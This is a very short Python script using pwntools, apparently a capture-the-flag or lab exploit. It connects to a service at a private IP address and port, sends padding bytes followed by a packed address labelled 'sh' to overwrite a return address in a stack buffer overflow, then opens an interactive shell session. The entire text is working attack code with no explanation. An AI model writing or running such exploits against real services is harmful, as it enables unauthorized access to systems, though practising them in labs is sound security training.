from pwn import *


sh = 0x849c
r = remote('192.168.200.11', 8888)


payload  = ''
payload += 'a'*20
payload += 'b'*4
payload += p32(sh)
raw_input()
r.sendline(payload)
r.interactive()
